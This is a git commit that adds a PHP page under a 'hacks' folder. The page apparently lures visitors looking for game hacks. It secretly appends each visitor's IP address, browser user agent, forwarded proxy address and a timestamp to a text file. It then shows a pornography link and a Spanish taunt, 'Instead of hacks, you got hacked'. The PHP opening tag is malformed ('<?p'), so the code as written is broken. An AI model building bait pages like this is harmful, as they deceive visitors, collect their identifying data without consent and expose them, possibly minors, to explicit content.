8434aefa79060e73c500613743fd86ca8c3598ef
xurxorguezz_ <68642973+xurxorguezz@users.noreply.github.com>
2024-05-25 18:17:25 +0200

    Add files via upload

---
+++ Simer00/hacks/index.php
@@ -0,0 +1,18 @@
+<?p
+$Fichero = "./hacks/archivo.txt"; 
+$ip = $_SERVER["REMOTE_ADDR"]; 
+$fecha = date("Y-m-d;H:i:s"); //HORA
+$sistema = $_SERVER['HTTP_USER_AGENT']; 
+$conproxy = $_SERVER["HTTP_X_FORWARDED_FOR"];//PROXYS (IPv4)
+$log = "FECHA: $fecha SISTEMA: $sistema IP: $ip IPPROXY: $conproxy \x0D\x0A"; 
+$fp = fopen($Fichero, "a" ); 
+fwrite($fp, $log); 
+fclose($fp); 
+?>ㅤ
+
+
+ㅤ<a href="https://es.pornhub.com/view_video.php?viewkey=ph6336109184738">Rip u</a> ㅤ
+
+<a href="https://instagram.com/xurxorguezz">En vez de hacks, fuiste hackeado</a>
+
+
